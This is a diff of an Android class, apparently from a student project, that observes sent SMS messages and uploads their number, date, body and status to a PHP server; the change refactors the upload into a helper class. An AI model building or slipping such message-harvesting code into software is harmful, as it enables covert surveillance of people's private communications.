@@ -25,7 +25,7 @@ public class SmsSentObserver extends ContentObserver {
 	//Mensajes Enviados
 	private static final String TAG = "SMSTRACKER";
     private static final Uri STATUS_URI = Uri.parse("content://sms");
-    private static String url_insertar_mensaje = "http://10.0.0.10:8080/ProyectoSoftwareAndroidAdmin/insertar_mensaje.php";
+    private static String url_insertar_mensaje = "insertar_mensaje.php";
     private Context mContext;
     private  String numero;
 	 private String estado;
@@ -108,27 +108,8 @@ class InsertarMensaje extends AsyncTask<String, String, String> {
 	        params.add(new BasicNameValuePair("fecha", fecha));
 	        params.add(new BasicNameValuePair("cuerpo", cuerpo));
 	        params.add(new BasicNameValuePair("estatus", estado));
-	        // getting JSON Object
-	        // Note that create product url accepts POST method
-	        JSONObject json = jsonParser.makeHttpRequest(url_insertar_mensaje,
-	                "POST", params);
-
-	        // check log cat from response
-	        Log.d("Create Response", json.toString());
-
-	        // check for success tag
-	        try {
-	            int success = json.getInt(TAG_SUCCESS);
-
-	            if (success == 1) {
-	                // successfully created product
-	                // closing this screen
-	            } else {
-	                // failed to create product
-	            }
-	        } catch (JSONException e) {
-	            e.printStackTrace();
-	        }
+	        EnvioWeb envioMensajes = new EnvioWeb (url_insertar_mensaje, params);
+	        envioMensajes.envio();
 	    return null;
     	}
 
